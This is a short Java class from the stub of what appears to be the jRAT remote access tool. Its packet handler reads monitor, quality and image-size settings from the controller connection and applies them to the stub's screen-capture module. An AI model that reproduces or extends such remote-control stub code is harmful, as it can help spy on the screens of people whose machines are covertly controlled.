package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.Screen;

public class Packet50UpdateRemoteScreen extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		int monitor = Connection.readInt();
		int quality = Connection.readInt();
		int size = Connection.readInt();
		
		if (Screen.instance != null) {
			Screen.instance.setMonitor(monitor);
			Screen.instance.setQuality(quality);
			Screen.instance.setImageSize(size);
		}
	}

}
